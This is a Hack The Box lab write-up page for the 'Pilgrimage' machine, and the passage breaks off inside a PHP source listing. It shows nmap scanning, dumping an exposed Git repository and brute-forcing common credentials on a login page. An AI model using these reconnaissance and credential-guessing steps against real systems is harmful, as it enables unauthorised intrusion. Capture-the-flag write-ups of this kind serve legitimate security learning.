@@ -1,0 +1,890 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    
+        <meta name="author" content="Matthieu Mezirard">
+    
+    <meta name="author" content="Matthieu Mezirard" />
+    
+        <meta name="description" content="This is an easy Linux box.">
+    
+    <title>
+        
+            
+        
+        root@mmezirard:~&#x2F;htb-write-ups&#x2F;boxes&#x2F;pilgrimage#
+    </title>
+    <link rel="icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="stylesheet" type="text/css" href="/main.css" />
+    <link
+        id="theme-light-style"
+        rel="stylesheet"
+        type="text/css"
+        href="/theme/light.css"
+    />
+    <link
+        id="theme-dark-style"
+        rel="stylesheet"
+        type="text/css"
+        href="/theme/dark.css"
+    />
+    <script
+        async
+        src="https://eu.umami.is/script.js"
+        data-website-id="ab1b120c-cc97-47d0-bddb-d1a96cb06e5a"
+    ></script>
+    <script src="/js/theme-toggle.js"></script>
+    <script src="/js/code-wrapper.js"></script>
+    <script src="/js/code-indicator.js"></script>
+</head>
+
+
+    <body>
+        <header>
+    <div class="left">
+        <a href="/">
+    mmezirard
+</a>
+
+        <div class="socials">
+    
+        <a class="social" href="https:&#x2F;&#x2F;github.com&#x2F;mmezirard&#x2F;">
+            <img src="/icons/github.svg" alt="github" />
+        </a>
+    
+        <a class="social" href="https:&#x2F;&#x2F;app.hackthebox.com&#x2F;users&#x2F;1301891&#x2F;">
+            <img src="/icons/hack-the-box.svg" alt="hack-the-box" />
+        </a>
+    
+        <a class="social" href="https:&#x2F;&#x2F;hackerone.com&#x2F;mmezirard&#x2F;">
+            <img src="/icons/hackerone.svg" alt="hackerone" />
+        </a>
+    
+</div>
+
+    </div>
+    <div class="right">
+        <nav>
+    <ul>
+        
+            <li>
+                <a href="&#x2F;htb-write-ups">
+                    &#x2F;htb-write-ups
+                </a>
+            </li>
+        
+    </ul>
+</nav>
+
+        <button onclick="toggleTheme()">
+    <img id="theme-toggle-sun" src="/icons/sun.svg" alt="Sun" />
+    <img id="theme-toggle-moon" src="/icons/moon.svg" alt="Moon" />
+</button>
+<script src="/js/theme-toggle.js"></script>
+
+    </div>
+</header>
+
+        
+    <main>
+        
+<article>
+    <div>
+        
+    
+        <div class="page-h1">
+            Pilgrimage<span>.</span>
+        </div>
+    
+
+
+        <div class="page-metadata">
+            
+                Posted on <time>2024-03-24</time>
+            
+        </div>
+
+        
+            <img
+                class="page-cover"
+                alt="cover.png"
+                src="https://mmezirard.github.io/htb-write-ups/boxes/pilgrimage/cover.png"
+            />
+        
+    </div>
+
+    
+        <h1>Table of Contents</h1>
+        <ul>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/pilgrimage/#information">Information</a>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/pilgrimage/#setup">Setup</a>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/pilgrimage/#host-10-10-11-219">Host 10.10.11.219</a>
+                    
+                        <ul>
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/pilgrimage/#scanning">Scanning</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/pilgrimage/#ports">Ports</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/pilgrimage/#fingerprinting">Fingerprinting</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/pilgrimage/#scripts">Scripts</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/pilgrimage/#services-enumeration">Services enumeration</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/pilgrimage/#nginx">Nginx</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/pilgrimage/#foothold-ssh">Foothold (SSH)</a>
+                                </li>
+
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/pilgrimage/#getting-a-lay-of-the-land">Getting a lay of the land</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/pilgrimage/#architecture">Architecture</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/pilgrimage/#distribution">Distribution</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/pilgrimage/#kernel">Kernel</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/pilgrimage/#users">Users</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/pilgrimage/#groups">Groups</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/pilgrimage/#nics">NICs</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/pilgrimage/#hostname">Hostname</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/pilgrimage/#system-enumeration">System enumeration</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/pilgrimage/#flags">Flags</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/pilgrimage/#inspecting-usr-sbin-malwarescan-sh">Inspecting &#x2F;usr&#x2F;sbin&#x2F;malwarescan.sh</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/pilgrimage/#os-command-injection">OS command injection</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/pilgrimage/#known-vulnerabilities-1">Known vulnerabilities</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/pilgrimage/#privilege-escalation-cve-2022-4510">Privilege escalation (CVE-2022-4510)</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/pilgrimage/#preparation">Preparation</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/pilgrimage/#exploitation-1">Exploitation</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/pilgrimage/#spawning-a-pty-establishing-persistence">Spawning a pty &amp; establishing persistence</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/pilgrimage/#system-enumeration-1">System enumeration</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/pilgrimage/#flags-1">Flags</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                        </ul>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/pilgrimage/#afterwords">Afterwords</a>
+                    
+                </li>
+            
+        </ul>
+    
+
+    <section><h1 id="information">Information</h1>
+<p><strong>Difficulty</strong>: Easy</p>
+<p><strong>OS</strong>: Linux</p>
+<p><strong>Release date</strong>: 2023-06-24</p>
+<p><strong>Created by</strong>: <a href="https://app.hackthebox.com/users/55851">coopertim13</a></p>
+<h1 id="setup">Setup</h1>
+<p>I'll attack this box from a Kali Linux VM as the <code>root</code> user — not a great
+practice security-wise, but it's a VM so it's alright. This way I won't have to
+prefix some commands with <code>sudo</code>, which gets cumbersome in the long run.</p>
+<p>I like to maintain consistency in my workflow for every box, so before starting
+with the actual pentest, I'll prepare a few things:</p>
+<ol>
+<li>
+<p>I'll create a directory that will contain every file related to this box.
+I'll call it <code>workspace</code>, and it will be located at the root of my filesystem
+<code>/</code>.</p>
+</li>
+<li>
+<p>I'll create a <code>server</code> directory in <code>/workspace</code>. Then, I'll use
+<code>httpsimpleserver</code> to create an HTTP server on port <code>80</code> and
+<code>impacket-smbserver</code> to create an SMB share named <code>server</code>. This will make
+files in this folder available over the Internet, which will be especially
+useful for transferring files to the target machine if need be!</p>
+</li>
+<li>
+<p>I'll place all my tools and binaries into the <code>/workspace/server</code> directory.
+This will come in handy once we get a foothold, for privilege escalation and
+for pivoting inside the internal network.</p>
+</li>
+</ol>
+<p>I'll also strive to minimize the use of Metasploit, because it hides the
+complexity of some exploits, and prefer a more manual approach when it's not too
+much hassle. This way, I'll have a better understanding of the exploits I'm
+running, and I'll have more control over what's happening on the machine.</p>
+<p>Throughout this write-up, my machine's IP address will be <code>10.10.14.4</code>. The
+commands ran on my machine will be prefixed with <code>❯</code> for clarity, and if I ever
+need to transfer files or binaries to the target machine, I'll always place them
+in the <code>/tmp</code> or <code>C:\tmp</code> folder to clean up more easily later on.</p>
+<p>Now we should be ready to go!</p>
+<h1 id="host-10-10-11-219">Host <code>10.10.11.219</code></h1>
+<h2 id="scanning">Scanning</h2>
+<h3 id="ports">Ports</h3>
+<p>As usual, let's start by initiating a port scan on Pilgrimage using a TCP SYN
+<code>nmap</code> scan to assess its attack surface.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.11.219<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p-</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT   STATE SERVICE
+</span><span class="z-text z-plain">22/tcp open  ssh
+</span><span class="z-text z-plain">80/tcp open  http
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>Let's also check the 500 most common UDP ports.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sU</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.11.219<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>top-ports</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>500<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<h3 id="fingerprinting">Fingerprinting</h3>
+<p>Following the ports scans, let's gather more data about the services associated
+with the open TCP ports we found.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.11.219<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>22,80<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sV</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT   STATE SERVICE VERSION
+</span><span class="z-text z-plain">22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+</span><span class="z-text z-plain">80/tcp open  http    nginx 1.18.0
+</span><span class="z-text z-plain">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>Alright, so <code>nmap</code> managed to determine that Pilgrimage is running Linux, and
+the version of SSH suggests that it might be Debian.</p>
+<h3 id="scripts">Scripts</h3>
+<p>Let's run <code>nmap</code>'s default scripts on the TCP services to see if they can find
+additional information.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.11.219<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>22,80<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sC</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT   STATE SERVICE
+</span><span class="z-text z-plain">22/tcp open  ssh
+</span><span class="z-text z-plain">| ssh-hostkey: 
+</span><span class="z-text z-plain">|   3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3 (RSA)
+</span><span class="z-text z-plain">|   256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af (ECDSA)
+</span><span class="z-text z-plain">|_  256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04 (ED25519)
+</span><span class="z-text z-plain">80/tcp open  http
+</span><span class="z-text z-plain">|_http-title: Did not follow redirect to http://pilgrimage.htb/
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>The <code>http-title</code> script indicates that the Nginx server redirects to
+<code>http://pilgrimage.htb/</code>. I'll add it to my <code>/etc/hosts</code> file.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> echo <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.11.219 pilgrimage.htb<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-keyword z-operator z-assignment z-redirection z-shell">&gt;&gt;</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/etc/hosts<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<p>Now I'll run <code>nmap</code>'s default scripts on the web server once again.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>pilgrimage.htb<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>80<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sC</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT   STATE SERVICE
+</span><span class="z-text z-plain">80/tcp open  http
+</span><span class="z-text z-plain">| http-cookie-flags: 
+</span><span class="z-text z-plain">|   /: 
+</span><span class="z-text z-plain">|     PHPSESSID: 
+</span><span class="z-text z-plain">|_      httponly flag not set
+</span><span class="z-text z-plain">|_http-title: Pilgrimage - Shrink Your Images
+</span><span class="z-text z-plain">| http-git: 
+</span><span class="z-text z-plain">|   10.10.11.219:80/.git/
+</span><span class="z-text z-plain">|     Git repository found!
+</span><span class="z-text z-plain">|     Repository description: Unnamed repository; edit this file &#39;description&#39; to name the...
+</span><span class="z-text z-plain">|_    Last commit message: Pilgrimage image shrinking service initial commit. # Please ...
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>The <code>http-git</code> script found a Git repository.</p>
+<h2 id="services-enumeration">Services enumeration</h2>
+<h3 id="nginx">Nginx</h3>
+<h4 id="exploration">Exploration</h4>
+<p>Let's browse to <code>http://pilgrimage.htb/</code>.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/pilgrimage/domain-homepage.png" alt="Domain homepage" /></p>
+<p>It's a website to shrink images.</p>
+<h4 id="fingerprinting-1">Fingerprinting</h4>
+<p>Let's fingerprint the technologies used by this web page with the
+<a href="https://www.wappalyzer.com/">Wappalyzer</a> extension.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/pilgrimage/domain-homepage-wappalyzer.png" alt="Domain homepage Wappalyzer extension" /></p>
+<p>This reveals that this web page is using PHP.</p>
+<p>Moreover, the footer of the website leaks that it's using a template made by
+<a href="https://templatemo.com/">TemplateMo</a>, and the source code of the web page
+specifies that it's the
+<a href="https://templatemo.com/tm-580-woox-travel">Woox Travel Template</a> template.</p>
+<h4 id="exploration-1">Exploration</h4>
+<p>Let's upload an image and press on 'Shrink'.</p>
+<p>A link gets added to the DOM under the form. In my case, it's
+<code>http://pilgrimage.htb/shrunk/65f6e5d21c71c.png</code>. Therefore, I assume that the
+shrunked images are stored in <code>/shrunk</code>.</p>
+<p>I also tried to upload a text file, but in this case a 'Image shrink failed'
+message is added to the DOM.</p>
+<h4 id="under-the-hood">Under the hood</h4>
+<p>When we upload an image to shrink it, a POST request is sent to <code>/</code> with
+multipart form data like:</p>
+<pre class="z-code"><code><span class="z-text z-plain">-----------------------------400170119923520700911158460083
+</span><span class="z-text z-plain">Content-Disposition: form-data; name=&quot;toConvert&quot;; filename=&quot;image.png&quot;
+</span><span class="z-text z-plain">Content-Type: image/png
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">&lt;CONTENT&gt;
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">-----------------------------400170119923520700911158460083--
+</span></code></pre>
+<p>If the processing is successful, the response <code>Location</code> header is set to
+<code>/?message=http://pilgrimage.htb/shrunk/&lt;NUMBER&gt;.png&amp;status=success</code>.</p>
+<p>If it's not, the <code>Location</code> header is set to
+<code>/?message=Image shrink failed&amp;status=fail</code>.</p>
+<h4 id="file-upload">File upload</h4>
+<p>After a bit of testing, I determined that the server doesn't validate the MIME
+type specified in the upload request. No matter which MIME type we specify for
+our file, the response has a <code>Location</code> header corresponding to a valid
+processing.</p>
+<p>However, the magic byte of the file we input seems to be validated. And no
+matter the extension of the file we input, the shrunked image always has an
+extension corresponding to its magic byte.</p>
+<p>Besides, only the <code>image/png</code> and <code>image/jpeg</code> MIME types are accepted by the
+frontend. I tried other extensions, and it looks like these are indeed the only
+two MIME types corresponding to supported file types.</p>
+<p>Furthermore, the filename of the processed image looks pseudo-random, since the
+first characters upon successive requests are the same.</p>
+<h4 id="exploration-2">Exploration</h4>
+<p>The website also indicates that we can create an account to save the shrunked
+images.</p>
+<p>Let's browse to <code>http://pilgrimage.htb/register.php</code>:</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/pilgrimage/domain-register-page.png" alt="Domain register page" /></p>
+<p>We can sign up using only a username and a password. I'll create a <code>dummy</code> user.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/pilgrimage/domain-dashboard-page.png" alt="Domain dashboard page" /></p>
+<p>We're redirected to <code>/dashboard.php</code>, and we see a table with the original image
+name and the shrunked image URL corresponding to the images uploaded by our
+user. Since I just created this account, it's empty.</p>
+<p>I'll upload a .PNG image.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/pilgrimage/domain-dashboard-page-image-uploaded.png" alt="Domain dashboard page image uploaded" /></p>
+<p>It gets added to the table.</p>
+<p>Invalid file processings are not recorded in the table though, so I don't see
+how this functionality could be useful to us.</p>
+<p>There's also a <code>/login.php</code> page that we can use to log in using a username and
+a password.</p>
+<p>I launched a Cluster bomb attack on Burp Suite using
+<a href="https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt">this wordlist</a>
+for the usernames and
+<a href="https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/top-passwords-shortlist.txt">this wordlist</a>
+for the passwords to test for common credentials. Unfortunately, they all
+failed.</p>
+<h4 id="exploring-the-git-repository">Exploring the Git repository</h4>
+<p>Back in the <a href="https://mmezirard.github.io/htb-write-ups/boxes/pilgrimage/#scripts">Scripts</a> section, we found that the website hosted a Git
+repository. Let's retrieve its content.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> git-dumper <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>http://pilgrimage.htb/.git/<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/workspace/git<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<p>It finds loads of files.</p>
+<p>I'll open this repository with <a href="https://www.gitkraken.com/">GitKraken</a>.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/pilgrimage/gitkraken-git-repository.png" alt="GitKraken git repository" /></p>
+<p>There's a single commit to the <code>master</code> branch with the comment 'Pilgrimage
+image shrinking service initial commit'.</p>
+<p>Since we know that the shrinking logic is in the <code>index.php</code> file, let's start
+by inspecting this file.</p>
+<pre data-lang="php" class="language-php z-code"><code class="language-php" data-lang="php"><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-punctuation z-section z-embedded z-begin z-php">&lt;?php</span></span><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-meta z-function-call z-php"><span class="z-support z-function z-session z-php">session_start</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span></span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-meta z-include z-php"><span class="z-keyword z-control z-import z-include z-php">require_once</span> <span class="z-string z-quoted z-double z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&quot;</span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"></span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php">assets/bulletproof.php</span><span class="z-punctuation z-definition z-string z-end z-php">&quot;</span></span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-meta z-function z-php"><span class="z-storage z-type z-function z-php">function</span> <span class="z-entity z-name z-function z-php">isAuthenticated</span></span><span class="z-meta z-function z-parameters z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function z-parameters z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span><span class="z-meta z-function z-php">
+</span></span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-meta z-function z-php"><span class="z-meta z-block z-php"><span class="z-punctuation z-section z-block z-begin z-php">{</span></span></span><span class="z-meta z-function z-php"><span class="z-meta z-block z-php">
+</span></span></span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-meta z-function z-php"><span class="z-meta z-block z-php">    <span class="z-keyword z-control z-php">return</span> <span class="z-meta z-function-call z-php"><span class="z-support z-function z-json z-php">json_encode</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-meta z-function-call z-php"><span class="z-support z-function z-construct z-php">isset</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-variable z-other z-global z-safer z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>_SESSION</span><span class="z-meta z-item-access z-php"><span class="z-punctuation z-section z-brackets z-begin z-php">[</span></span><span class="z-meta z-item-access z-arguments z-php"><span class="z-string z-quoted z-double z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&quot;</span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"></span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php">user</span><span class="z-punctuation z-definition z-string z-end z-php">&quot;</span></span></span><span class="z-meta z-item-access z-php"><span class="z-punctuation z-section z-brackets z-end z-php">]</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span></span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span></span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
+</span></span></span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-meta z-function z-php"><span class="z-meta z-block z-php"></span></span><span class="z-meta z-function z-php"><span class="z-meta z-block z-php"><span class="z-punctuation z-section z-block z-end z-php">}</span></span></span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-meta z-function z-php"><span class="z-storage z-type z-function z-php">function</span> <span class="z-entity z-name z-function z-php">returnUsername</span></span><span class="z-meta z-function z-parameters z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function z-parameters z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span><span class="z-meta z-function z-php">
+</span></span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-meta z-function z-php"><span class="z-meta z-block z-php"><span class="z-punctuation z-section z-block z-begin z-php">{</span></span></span><span class="z-meta z-function z-php"><span class="z-meta z-block z-php">
